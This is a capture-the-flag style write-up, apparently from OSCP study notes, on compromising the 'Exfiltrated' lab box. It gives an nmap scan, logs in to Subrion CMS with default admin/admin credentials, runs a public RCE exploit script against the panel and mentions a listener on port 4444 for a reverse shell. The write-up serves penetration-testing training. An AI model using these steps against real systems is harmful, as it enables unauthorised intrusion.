#### Enumeration

##### Nmap 

```
# Nmap 7.91 scan initiated Sat Sep 25 11:29:21 2021 as: nmap -Pn -p- -sC -sV -T4 -oN Exfiltrated.nmap 192.168.107.163
Nmap scan report for 192.168.107.163
Host is up (0.20s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 25 11:50:58 2021 -- 1 IP address (1 host up) scanned in 1297.06 seconds
```

Because we can't open the website through IP, we must modify DNS file.

```
sudo vim /etc/hosts
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Exfiltrated/Exfiltrated_2021.09.30_22h48m42s_001_.png)

The website is running Subrion CMS 4.2 and we found a RCE exploit to try.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Exfiltrated/Exfiltrated_2021.09.30_23h08m58s_002_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Exfiltrated/Exfiltrated_2021.09.30_23h18m36s_003_.png)

We successfully logged in with default credential. The username is ```admin``` and the password is ```admin``` too. Next we can try to use the [exploit](https://www.exploit-db.com/exploits/49876). In order to get the full shell function I started a terminal listening on port 4444 and reconnected.

```
python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Exfiltrated/Exfiltrated_2021.09.30_23h43m00s_004_.png)
